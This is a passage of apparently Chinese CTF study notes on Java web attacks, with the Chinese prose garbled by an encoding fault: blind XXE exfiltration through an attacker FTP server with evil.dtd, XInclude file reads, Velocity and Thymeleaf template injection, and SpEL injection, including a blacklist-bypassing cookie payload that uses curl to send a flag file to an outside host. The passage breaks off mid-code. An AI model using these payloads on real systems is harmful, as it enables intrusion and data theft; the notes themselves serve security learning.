srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿™ç‚¹æ›¾ç»åœ¨æŸä¸ªæ¯”èµ›ä¸­é‡åˆ°è¿‡ã€‚å½“æ—¶é¢˜ç›®åç«¯ä½¿ç”¨çš„æ˜¯phpã€‚ä½†æ˜¯å®ƒæœ‰ä¸€ä¸ªå°†xmlèŠ‚ç‚¹æ¸²æŸ“æˆå›¾ç‰‡å¹¶å›æ˜¾çš„åŠŸèƒ½ã€‚åƒè¿™ç§åŠŸèƒ½çš„åº•éƒ¨å®ç°å¾ˆæœ‰å¯èƒ½æ˜¯javaè¾¾æˆçš„ã€‚å› æ­¤åœ¨ä¸çŸ¥é“è·¯å¾„æ–‡ä»¶åè¯»å–æºç æ—¶å¯ä»¥é€šè¿‡åˆ—ç›®å½•è§£å†³é—®é¢˜ã€‚</p><ul><li>javaçš„xxeä¸èƒ½è¯»å–å¤šè¡Œçš„é—®é¢˜</li></ul><p>è¿™ä¸ªç›¸æ¯”è¾ƒphpè€Œè¨€ç®—æ˜¯æ¯”è¾ƒå¤§çš„é—®é¢˜ã€‚phpçš„ä¼ªåè®®ä¸ºå…¶è¯»å–æ–¹å¼å¸¦æ¥äº†å¾ˆå¤§çš„ä¾¿åˆ©,å¹¶ä¸”å‡ ä¹æ˜¯ä¸‡é‡‘æ²¹ã€‚ä½†æ˜¯javaçš„xxeæœ‰æ—¶è¯»å–ä¸åˆ°å¤šè¡Œå®Œå…¨æ˜¯å–å†³äºjdkçš„ç‰ˆæœ¬å¹¶ä¸”æ™®éå­˜åœ¨è¯»å–ä¸äº†<code>&lt; %</code>çš„é—®é¢˜ã€‚</p><p>é€šå¸¸æˆ‘ä»¬åœ¨ç›²æ‰“java oob xxeæ—¶æ™®éé€‰æ‹©ftpåè®®(å…¶å®æ˜¯å› ä¸ºæ”¯æŒçš„å¯å¤–è¿çš„åè®®åªæœ‰http/s ftp)ã€‚httpåªèƒ½è¯»å–å•è¡Œæ–‡ä»¶ã€‚ftpåˆ™åœ¨ä¸åŒç‰ˆæœ¬ä¸‹æœ‰ä¸åŒè¡¨ç°<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/9.PNG" class="lazyload" data-srcset="9.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿™é‡Œå…¶ä»–å¤§ä½¬æ™®éé’ˆå¯¹è¿™ä¸ªé—®é¢˜è¿›è¡Œäº†ç ”ç©¶<br><a href="https://landgrey.me/blog/9/" target="_blank" rel="noopener">https://landgrey.me/blog/9/</a><br><a href="https://www.leadroyal.cn/?p=914" target="_blank" rel="noopener">https://www.leadroyal.cn/?p=914</a><br>ç»“è®ºæ˜¯:</p><blockquote><p>ä½¿ç”¨ftp è¿›è¡Œ oob æ—¶ï¼Œå¯¹ç‰ˆæœ¬æœ‰é™åˆ¶ï¼Œ &lt;7u141 å’Œ &lt;8u162 æ‰å¯ä»¥è¯»å–æ•´ä¸ªæ–‡ä»¶,å…¨ç‰ˆæœ¬ http éƒ½åªå¯ä»¥è¯»å•è¡Œæ–‡ä»¶</p></blockquote><p>æ€»ä¹‹é‡åˆ°é—®é¢˜å…ˆæ‰“ä¸Šä¸€å‘çœ‹çœ‹ã€‚è¿™é‡Œæ”¾å‡ºftpserverçš„rubyä»£ç ã€‚å› ä¸ºvpsç«¯å£é—®é¢˜æˆ‘æŠŠç«¯å£æ”¹äº†</p><pre><code class="ruby">require &#39;socket&#39;server = TCPServer.new 8001loop do  Thread.start(server.accept) do |client|    puts &quot;New client connected&quot;    data = &quot;&quot;    client.puts(&quot;220 xxe-ftp-server&quot;)    loop {        req = client.gets()        puts &quot;&lt; &quot;+req        if req.include? &quot;USER&quot;            client.puts(&quot;331 password please - version check&quot;)        else           #puts &quot;&gt; 230 more data please!&quot;            client.puts(&quot;230 more data please!&quot;)        end    }  endend</code></pre><p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/10.PNG" class="lazyload" data-srcset="10.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>payload</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;http://xxxx/evil.dtd&quot;&gt;%remote;]&gt;&lt;root/&gt;</code></pre><p>evil.dtd</p><pre><code class="xml">&lt;!ENTITY % payload SYSTEM &quot;file:///etc/passwd&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; trick SYSTEM &#39;ftp://fakeuser:fakepass@xxxxxxxx:8001/%payload;&#39;&gt;&quot;&gt;%int;%trick</code></pre><p>å½“ç„¶ä»¥ä¸Šé’ˆå¯¹çš„æ˜¯OOB.ä¹Ÿå°±æ˜¯ç›²æ‰“å¤–å¸¦çš„æ–¹æ³•</p><ul><li>Xinclude xxe</li></ul><p>è¿™ç‚¹æˆ‘å€’æ˜¯éå¸¸æ„Ÿå…´è¶£ã€‚å› ä¸ºå‰ä¸ä¹…çš„htb Quickè¿™å°é¶æœºå°±ç”¨åˆ°äº†xinclude+xsltçš„RCE(æ²¡é”™,å…¶å®æ˜¯å¼•å…¥é€šè¿‡å¤–éƒ¨xmlè¾¾æˆRCE)</p><p>å½“ç„¶ä¸æ˜¯æ‰€æœ‰æœåŠ¡éƒ½èƒ½åƒEsigateé‚£æ ·æœ‰è¿™ä¹ˆä½çº§çš„é”™è¯¯ã€‚æ­£å¸¸æ¥è¯´æˆ‘ä»¬ä¸€èˆ¬æ˜¯å¯ä»¥å°è¯•xxeè¯»æ–‡ä»¶</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;root xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt; &lt;xi:include href=&quot;file:///etc/passwd&quot; parse=&quot;text&quot;/&gt;&lt;/root&gt;</code></pre><p>å¯¹äºphpè€Œè¨€ã€‚ä¸éœ€è¦æ‰“å¼€å¤–éƒ¨å®ä½“å¼•ç”¨é€‰é¡¹ï¼Œä¹Ÿèƒ½ä½¿ç”¨xincludeè¯»å–æœ¬åœ°æ–‡ä»¶ã€‚</p><p>è¿™é‡Œé¡ºä¾¿åˆ†äº«ä¸‹htb é‚£é‡Œå‚è€ƒçš„æ–‡ç« ã€‚æˆ‘è®¤ä¸ºå…¶åˆ©ç”¨å¯¹äºæå‡xxeä½œç”¨è¿™ç‚¹æ˜¯å¾ˆæœ‰å‚è€ƒä»·å€¼çš„ã€‚<a href="https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/" target="_blank" rel="noopener">https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/</a></p><p>æ€»è€Œè¨€ä¹‹,javaè¿›è¡Œxxeç›¸æ¯”å¸¸è§çš„phpåç«¯è€Œè¨€å¤šäº†è®¸å¤šé™åˆ¶ã€‚ä½†æ˜¯å¯ä»¥åˆ—ç›®å½•è¿™ç‚¹æ˜¯å…³é”®ã€‚åŒæ—¶é‡åˆ°è¦ç›²æ‰“æ—¶ï¼Œftpæ˜¯æœ€å¥½çš„é€‰æ‹©ã€‚é˜²å¾¡ä¸Š,ä½¿ç”¨setFeatureå°±èƒ½è®©å¤–éƒ¨å®ä½“ä¸è¢«åŠ è½½ã€‚</p><h3 id="ssti"><a href="#ssti" class="headerlink" title="ssti"></a>ssti</h3><p>Javaçš„sstiç›¸æ¯”è¾ƒjinjaç­‰ç­‰è€Œè¨€è¿˜æ˜¯å¾ˆå¥½ç†è§£çš„ã€‚åªæ˜¯å¯¹äºä¸åŒæ¡†æ¶åº”å¯¹æ‰‹æ®µä¸åŒ</p><pre><code class="java">package org.joychou.controller;import org.apache.velocity.VelocityContext;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;import org.apache.velocity.app.Velocity;import java.io.StringWriter;@RestController@RequestMapping(&quot;/ssti&quot;)public class SSTI {    /**     * SSTI of Java velocity. The latest Velocity version still has this problem.     * Fix method: Avoid to use Velocity.evaluate method.     * &lt;p&gt;     * http://localhost:8080/ssti/velocity?template=%23set($e=%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22open%20-a%20Calculator%22)     * Open a calculator in MacOS.     *     * @param template exp     */    @GetMapping(&quot;/velocity&quot;)    public void velocity(String template) {        Velocity.init();        VelocityContext context = new VelocityContext();        context.put(&quot;author&quot;, &quot;Elliot A.&quot;);        context.put(&quot;address&quot;, &quot;217 E Broadway&quot;);        context.put(&quot;phone&quot;, &quot;555-1337&quot;);        StringWriter swOut = new StringWriter();        Velocity.evaluate(context, swOut, &quot;test&quot;, template);    }}</code></pre><p>æ­¤å¤„æ˜¯ä¸€ä¸ªVelocityçš„sstiã€‚payloadæ˜¯<code>#set($e=&quot;e&quot;);$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;curl xxxx&quot;)</code></p><p>å¯ä»¥çœ‹å‡ºæ¸²æŸ“çš„è¯­å¥æ˜¯<code>#</code>å¼€å¤´åæ¥ä¸€ä¸ªåå°„æ„é€ çš„å‘½ä»¤æ‰§è¡Œpayload.<code>$e</code>ä¸ºå­—ç¬¦ä¸²ã€‚å› æ­¤åé¢å°±æ˜¯ä»<code>java.lang.String</code>å¯¹è±¡å¼€å§‹è·å–ç±»ï¼Œæ–¹æ³•ï¼Œæ‰§è¡Œå‘½ä»¤ã€‚</p><p>è¿™ç‚¹ä¸Šä»æŸç§è§’åº¦ä¸SpELéå¸¸ç›¸ä¼¼ã€‚å½“ç„¶åé¢åšSpELæ³¨å…¥æ—¶å†ç»†è®²ã€‚è¿™é‡Œåˆ†äº«ä¸€ä¸ªä¹‹å‰åœ¨SharkyCTFä¸­é‡åˆ°çš„Thymeleaf sstiã€‚å› ä¸ºå½“æ—¶é¢˜ç›®åç«¯æŠŠå„ç§å‘½ä»¤æ‰§è¡Œéƒ½hookäº†,è‡ªå·±ä¸€ç›´æ²¡èƒ½æˆåŠŸæ‰§è¡Œå‘½ä»¤,è™½ç„¶å®é™…ä¸Šä¸éœ€è¦å‘½ä»¤æ‰§è¡Œå°±èƒ½åš,ä½†æ˜¯æŸ¥èµ„æ–™çš„è¿‡ç¨‹ä¸­ä¹Ÿæœ‰äº†æ–°çš„æ”¶è·ã€‚</p><p><a href="https://ctftime.org/task/11563" target="_blank" rel="noopener">https://ctftime.org/task/11563</a></p><p>è¿™é¢˜å› ä¸ºä½¿ç”¨äº†Thymeleaf.åŠ ä¸Šæˆ‘åœ¨ä½¿ç”¨<code>[[${7*7}]]</code>æ—¶è¿”å›äº†49ã€‚æ‰€ä»¥æˆ‘è®¤ä¸ºæ˜¯ä½¿ç”¨äº†<code>Thymeleaf</code>æ¥è¿›è¡Œæ¸²æŸ“çš„ã€‚(Thymeleafæ˜¯é€šè¿‡ä¸¤ä¸ªä¸­æ‹¬å·å–å€¼çš„)å¯æƒœé¢˜ç›®åº•å±‚hookçš„éå¸¸ä¸¥,æ²¡èƒ½RCEã€‚è¯»æ–‡ä»¶çš„payload<br><code>[[${ new java.io.BufferReader(new java.io.FileReader(&quot;/etc/passwd&quot;)).readLine()}]]</code>éƒ½åšä¸åˆ°ã€‚æ¯”èµ›ç»“æŸåæ‰å‘ç°è¦çŒœflagè¿™ä¸ªclassçš„å­˜åœ¨çš„,æ¯”è¾ƒæ— è¯­ã€‚ä½†æ˜¯ä»ä¸­æˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹å‡º,java sstiå…¶å®å°±æ˜¯åˆ¤æ–­å‡ºå¯¹åº”å¼•æ“åç”¨æ¥è¿‘äºSpELçš„æ€è·¯æ¥è¿›è¡Œåˆ©ç”¨ã€‚å¦åˆ™å°±æ˜¯åˆ©ç”¨é¢˜ç›®ç¯å¢ƒä¸­çš„classè¯»å–å˜é‡.</p><p>æ¯”èµ›ä¸­å½“æ—¶å‚è€ƒäº†è¿™ç¯‡æ–‡ç« <a href="https://hawkinsecurity.com/2017/12/13/rce-via-spring-engine-ssti/" target="_blank" rel="noopener">https://hawkinsecurity.com/2017/12/13/rce-via-spring-engine-ssti/</a><br>å…¶å®ä»”ç»†æƒ³æƒ³æ€ä¹ˆçœ‹éƒ½æ˜¯SpELçš„æ„æ€â€¦â€¦æ‰€ä»¥ç›¸å…³æŠ€å·§è¿˜æ˜¯ç•™åˆ°ä¸‹ä¸€ç¯‡SpELè®²å§ã€‚</p><h3 id="SpEL"><a href="#SpEL" class="headerlink" title="SpEL"></a>SpEL</h3><p>vuln code</p><pre><code class="java">package org.joychou.controller;import org.springframework.expression.ExpressionParser;import org.springframework.expression.spel.standard.SpelExpressionParser;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;/** * SpEL Injection * * @author JoyChou @2019-01-17 */@RestControllerpublic class SpEL {    /**     * SPEL to RCE     * http://localhost:8080/spel/vul/?expression=xxx.     * xxx is urlencode(exp)     * exp: T(java.lang.Runtime).getRuntime().exec(&quot;curl xxx.ceye.io&quot;)     */    @GetMapping(&quot;/spel/vuln&quot;)    public String rce(String expression) {        ExpressionParser parser = new SpelExpressionParser();        // fix method: SimpleEvaluationContext        return parser.parseExpression(expression).getValue().toString();    }    public static void main(String[] args) {        ExpressionParser parser = new SpelExpressionParser();        String expression = &quot;T(java.lang.Runtime).getRuntime().exec(\&quot;open -a Calculator\&quot;)&quot;;        String result = parser.parseExpression(expression).getValue().toString();        System.out.println(result);    }}</code></pre><p>é¦–å…ˆ,SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´ æ˜¯EL(expression language)çš„ä¸€ç§ã€‚ä¹‹æ‰€ä»¥å«SpELæ˜¯å› ä¸ºå®ƒæ˜¯åº”ç”¨åœ¨Springæ¡†æ¶ä¸­çš„ã€‚ä¸è¿‡åªè¦æŒæ¡äº†SpELçš„ç›¸å…³çŸ¥è¯†ï¼Œæƒ³å¿…å…¶ä»–çš„è¡¨è¾¾å¼æ³¨å…¥æ¼æ´ä¹Ÿèƒ½æ”¶æ‰‹åˆ°æ“’æ¥å§ã€‚</p><p>SpELæœ‰è®¸å¤šç‰¹æ€§ï¼š</p><ul><li>ä½¿ç”¨Beançš„IDæ¥å¼•ç”¨Bean</li><li>å¯è°ƒç”¨æ–¹æ³•å’Œè®¿é—®å¯¹è±¡çš„å±æ€§</li><li>å¯å¯¹å€¼è¿›è¡Œç®—æ•°ã€å…³ç³»å’Œé€»è¾‘è¿ç®—</li><li>å¯ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼è¿›è¡ŒåŒ¹é…</li><li>å¯è¿›è¡Œé›†åˆæ“ä½œ</li></ul><p>å› æ­¤æˆ‘è®¤ä¸ºä¸Šé¢ä¸€ç±»javaçš„sstiåˆ©ç”¨æœ¬è´¨ä¸Šè¿˜æ˜¯åœ¨å®šç•Œç¬¦ä¸­è¿›è¡Œäº†è¡¨è¾¾å¼è¿ç®—,æ‰€ä»¥äº†è§£è¡¨è¾¾å¼æ³¨å…¥ä¹Ÿå°±æˆä¸ºäº†é‡ä¸­ä¹‹é‡ã€‚</p><p>é¦–å…ˆæ˜¯è¯­æ³•çŸ¥è¯†</p><ul><li>SpELæ”¯æŒçš„å®šç•Œç¬¦</li></ul><p><code>#{}</code></p><blockquote><p>å¼•ç”¨å…¶ä»–å¯¹è±¡:#{car}<br>å¼•ç”¨å…¶ä»–å¯¹è±¡çš„å±æ€§ï¼š#{car.brand}<br>è°ƒç”¨å…¶å®ƒæ–¹æ³• , è¿˜å¯ä»¥é“¾å¼æ“ä½œï¼š#{car.toString()}</p></blockquote><p>å±æ€§åç§°è¿˜å¯ä»¥ä½¿ç”¨<code>${xxxx}</code><br>æ­¤å¤–è¿˜æœ‰ä¸€ç§ä½¿ç”¨Tè¿ç®—ç¬¦,è°ƒç”¨ç±»ä½œç”¨åŸŸæ–¹æ³•å’Œå¸¸é‡<code>#{T(java.lang.Math)}</code>è¿”å›ä¸€ä¸ªjava.lang.Mathå¯¹è±¡</p><p>ä¸€èˆ¬æ¥è¯´æˆ‘ä»¬ä¼šæŠŠSpELç”¨åœ¨xmlé…ç½®æˆ–è€…æ³¨è§£çš„ä½¿ç”¨ä¸­ï¼Œè¿™åº”è¯¥æ˜¯æ˜¯ä¸ºäº†å…¶åŠ¨æ€æ€§ã€‚é™¤æ­¤ä¹‹å¤–å°±æ˜¯ç›´æ¥ç”¨åœ¨ä»£ç å—ä¸­è¿›è¡Œexpression.</p><p>å¯¼è‡´SpELæ³¨å…¥çš„åŸå› å¦‚ä¸‹:</p><blockquote><p>SimpleEvaluationContextå’ŒStandardEvaluationContextæ˜¯SpELæä¾›çš„ä¸¤ä¸ªEvaluationContextï¼š<br>SimpleEvaluationContextâ€‰- é’ˆå¯¹ä¸éœ€è¦SpELè¯­è¨€è¯­æ³•çš„å…¨éƒ¨èŒƒå›´å¹¶ä¸”åº”è¯¥å—åˆ°æœ‰æ„é™åˆ¶çš„è¡¨è¾¾å¼ç±»åˆ«ï¼Œå…¬å¼€SpELè¯­è¨€ç‰¹æ€§å’Œé…ç½®é€‰é¡¹çš„å­é›†ã€‚<br>StandardEvaluationContextâ€‰- å…¬å¼€å…¨å¥—SpELè¯­è¨€åŠŸèƒ½å’Œé…ç½®é€‰é¡¹ã€‚æ‚¨å¯ä»¥ä½¿ç”¨å®ƒæ¥æŒ‡å®šé»˜è®¤çš„æ ¹å¯¹è±¡å¹¶é…ç½®æ¯ä¸ªå¯ç”¨çš„è¯„ä¼°ç›¸å…³ç­–ç•¥ã€‚</p></blockquote><p>åœ¨ä¸æŒ‡å®šEvaluationContextçš„æƒ…å†µä¸‹é»˜è®¤é‡‡ç”¨çš„æ˜¯StandardEvaluationContextï¼Œè€Œå®ƒåŒ…å«äº†SpELçš„æ‰€æœ‰åŠŸèƒ½ï¼Œåœ¨å…è®¸ç”¨æˆ·æ§åˆ¶è¾“å…¥çš„æƒ…å†µä¸‹å¯ä»¥æˆåŠŸé€ æˆä»»æ„å‘½ä»¤æ‰§è¡Œã€‚</p><p>æ­¤å¤„javasecçš„SpELå‘½ä»¤æ‰§è¡Œç†è®ºä¸Šåªè¦ä½¿ç”¨</p><pre><code class="java">T(java.lang.Runtime).getRuntime().exec(&quot;curl xxx&quot;)</code></pre><p>å³å¯ã€‚ä¸è¿‡è¿™é‡Œæ‰§è¡Œæ—¶æ€»æ˜¯ä¸æˆåŠŸï¼Œæœ‰ç‚¹è¿·ã€‚ä½†æ˜¯æ²¡æœ‰å…³ç³»ï¼Œæ¯•ç«Ÿæ— è®ºæ¯”èµ›è¿˜æ˜¯å®æˆ˜éƒ½ä¸å¯èƒ½ç¢°ä¸Šæ²¡æœ‰wafçš„SpELã€‚è¿™é‡Œå¹²è„†ç›´æ¥æ‰¾å…¶ä»–çš„å‡ ä¸ªä¾‹å­æ¥è¯•è¯•<br>(å…¶å®æ‡’å¾—æœ¬åœ°å»ºä¸ªmavené¡¹ç›®äº†ï¼Œæˆ‘è‡ªå·±çˆ¬)</p><ul><li>code-breaking javacon</li></ul><p>å¹´åˆçš„é¢˜ä¸€ç›´ç•™åˆ°ç°åœ¨â€¦å°±æ˜¯ä¸ºäº†å­¦SpELçš„è¿™ä¸€å¤©ã€‚</p><p>é¢˜ç›®çš„æºç jarä¸‹å¥½åã€‚è€æ ·å­æ‰”è¿›libé‡Œç›´æ¥å®¡è®¡<br>ç»“æ„:<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/11.PNG" class="lazyload" data-srcset="11.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>åœ¨é…ç½®application.xmlä¸­æœ‰è¿™æ ·çš„é»‘åå•</p><pre><code>spring:  thymeleaf:    encoding: UTF-8    cache: false    mode: HTMLkeywords:  blacklist:    - java.+lang    - Runtime    - exec.*\(user:  username: admin  password: admin  rememberMeKey: c0dehack1nghere1</code></pre><p>æ˜¾ç„¶æ˜¯é™åˆ¶äº†Runtime.execçš„å‘½ä»¤æ‰§è¡Œã€‚ä½†æ˜¯å®é™…ä¸Šè¿™ä¸ªwafçœŸçš„éå¸¸å‹å¥½äº†â€¦</p><p>å†æ¥çœ‹ä¸»ä½“æºç </p><pre><code class="java">package io.tricking.challenge;import io.tricking.challenge.spel.SmallEvaluationContext;import java.util.regex.Matcher;import java.util.regex.Pattern;import javax.servlet.http.Cookie;import javax.servlet.http.HttpServletResponse;import javax.servlet.http.HttpSession;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.expression.Expression;import org.springframework.expression.ExpressionParser;import org.springframework.expression.ParserContext;import org.springframework.expression.common.TemplateParserContext;import org.springframework.expression.spel.standard.SpelExpressionParser;import org.springframework.http.HttpStatus;import org.springframework.stereotype.Controller;import org.springframework.ui.Model;import org.springframework.web.bind.annotation.CookieValue;import org.springframework.web.bind.annotation.ExceptionHandler;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.PostMapping;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.bind.annotation.ResponseStatus;import org.springframework.web.client.HttpClientErrorException;@Controllerpublic class MainController {    ExpressionParser parser = new SpelExpressionParser();    @Autowired    private KeyworkProperties keyworkProperties;    @Autowired    private UserConfig userConfig;    public MainController() {    }    @GetMapping    public String admin(@CookieValue(value = &quot;remember-me&quot;,required = false) String rememberMeValue, HttpSession session, Model model) {        if (rememberMeValue != null &amp;&amp; !rememberMeValue.equals(&quot;&quot;)) {            String username = this.userConfig.decryptRememberMe(rememberMeValue);            if (username != null) {                session.setAttribute(&quot;username&quot;, username);            }        }        Object username = session.getAttribute(&quot;username&quot;);        if (username != null &amp;&amp; !username.toString().equals(&quot;&quot;)) {            model.addAttribute(&quot;name&quot;, this.getAdvanceValue(username.toString()));            return &quot;hello&quot;;        } else {            return &quot;redirect:/login&quot;;        }    }    @GetMapping({&quot;/login&quot;})    public String login() {        return &quot;login&quot;;    }    @GetMapping({&quot;/login-error&quot;})    public String loginError(Model model) {        model.addAttribute(&quot;loginError&quot;, true);        model.addAttribute(&quot;errorMsg&quot;, &quot;ç™»é™†å¤±è´¥ï¼Œç”¨æˆ·åæˆ–è€…å¯†ç é”™è¯¯ï¼&quot;);        return &quot;login&quot;;    }    @PostMapping({&quot;/login&quot;})    public String login(@RequestParam(value = &quot;username&quot;,required = true) String username, @RequestParam(value = &quot;password&quot;,required = true) String password, @RequestParam(value = &quot;remember-me&quot;,required = false) String isRemember, HttpSession session, HttpServletResponse response) {        if (this.userConfig.getUsername().contentEquals(username) &amp;&amp; this.userConfig.getPassword().contentEquals(password)) {            session.setAttribute(&quot;username&quot;, username);            if (isRemember != null &amp;&amp; !isRemember.equals(&quot;&quot;)) {                Cookie c = new Cookie(&quot;remember-me&quot;, this.userConfig.encryptRememberMe());                c.setMaxAge(2592000);                response.addCookie(c);            }            return &quot;redirect:/&quot;;        } else {            return &quot;redirect:/login-error&quot;;        }    }    @ExceptionHandler({HttpClientErrorException.class})    @ResponseStatus(HttpStatus.FORBIDDEN)    public String handleForbiddenException() {        return &quot;forbidden&quot;;    }    private String getAdvanceValue(String val) {        String[] var2 = this.keyworkProperties.getBlacklist();        int var3 = var2.length;        for(int var4 = 0; var4 &lt; var3; ++var4) {            String keyword = var2[var4];            Matcher matcher = Pattern.compile(keyword, 34).matcher(val);            if (matcher.find()) {                throw new HttpClientErrorException(HttpStatus.FORBIDDEN);            }        }        ParserContext parserContext = new TemplateParserContext();        Expression exp = this.parser.parseExpression(val, parserContext);        SmallEvaluationContext evaluationContext = new SmallEvaluationContext();        return exp.getValue(evaluationContext).toString();    }}</code></pre><p>æµç¨‹éå¸¸ç®€å•ã€‚getAdvanceValueæ˜¯ä¸€ä¸ªè§£å¯†+æ£€æŸ¥é»‘åå•+è°ƒç”¨spelçš„æ–¹æ³•ã€‚è€Œæˆ‘ä»¬åœ¨ç™»å½•åç¨‹åºä¼šä»remembermeçš„cookieå¤„å¯¹è¡¨è¾¾å¼è¿›è¡Œè®¡ç®—ã€‚</p><p>æ³¨æ„åˆ°åŠ å¯†æ–¹å¼æºç </p><pre><code class="java">public String encryptRememberMe() {        String encryptd = Encryptor.encrypt(this.rememberMeKey, &quot;0123456789abcdef&quot;, this.username);        return encryptd;    }</code></pre><p>rememberMeKeyæˆ‘ä»¬æ˜¯çŸ¥é“çš„,æ‰€ä»¥å°±å¯ä»¥ç”Ÿæˆå¯¹åº”çš„cookiepayloadäº†ã€‚</p><pre><code class="java">#{T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;).getMethod(\&quot;ex\&quot;+\&quot;ec\&quot;,T(String[])).invoke(T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;).getMethod(\&quot;getRu\&quot;+\&quot;ntime\&quot;).invoke(T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;)),new String[]{\&quot;/bin/bash\&quot;,\&quot;-c\&quot;,\&quot;curl xxxx\&quot;})}</code></pre><p>è¿™é‡Œä½¿ç”¨çš„æ–¹æ³•æ˜¯é€šè¿‡å­—ç¬¦ä¸²æ‹¼æ¥æ¥ç»•è¿‡å…³é”®å­—è¿‡æ»¤çš„é—®é¢˜ã€‚å¹¶ä¸”æœ¬è´¨ä¸Šè¿˜æ˜¯ä½¿ç”¨çš„åå°„ä½œä¸ºåŸºç¡€payload.<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/12.PNG" class="lazyload" data-srcset="12.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>ç”Ÿæˆcookieçš„ä»£ç </p><pre><code class="java">public class spel {    public static void main(String[] args) {        System.out.println(Encryptor.encrypt(&quot;c0dehack1nghere1&quot;, &quot;0123456789abcdef&quot;, &quot;#{T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;).getMethod(\&quot;ex\&quot;+\&quot;ec\&quot;,T(String[])).invoke(T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;).getMethod(\&quot;getRu\&quot;+\&quot;ntime\&quot;).invoke(T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;)),new String[]{\&quot;/bin/bash\&quot;,\&quot;-c\&quot;,\&quot;curl xxxxx/`cat /fla*`\&quot;})}&quot;));    }}</code></pre><p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/13.PNG" class="lazyload" data-srcset="13.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>æ”¶ä¸‹flag.</p><p>ç”±äºè¿˜æœ‰å¾ˆå¤šCVEä¹Ÿæ˜¯SpELç›¸å…³ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç›¸ä¼¼çš„æ€è·¯æ„é€ payload.æ¯”å¦‚ç”¨javascriptå¼•æ“è·ŸProcessBuilder</p><pre><code class="java">//åå°„ 